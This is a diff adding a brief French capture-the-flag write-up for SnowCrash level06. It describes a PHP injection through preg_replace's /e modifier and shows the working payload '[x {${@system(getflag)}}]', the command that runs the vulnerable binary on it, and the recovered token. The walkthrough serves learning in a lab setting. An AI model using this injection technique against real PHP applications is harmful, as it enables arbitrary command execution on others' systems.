@@ -1,0 +1,10 @@
+Ici on peut faire une injection php grace a file_get_contents($y); present dans le script, on voit derriere que le preg_replace("/(\[x (.*)\])/e" contient une faille:
+https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
+
+On peut l'exploiter comme ca (source: http://v0ids3curity.blogspot.fr/2012/12/exploit-exercise-php-pregreplace.html):
+level06@SnowCrash:~$ echo '[x {${@system(getflag)}}]' > /tmp/tettouat/payload
+level06@SnowCrash:~$ ./level06 /tmp/tettouat/payload
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+Voila!
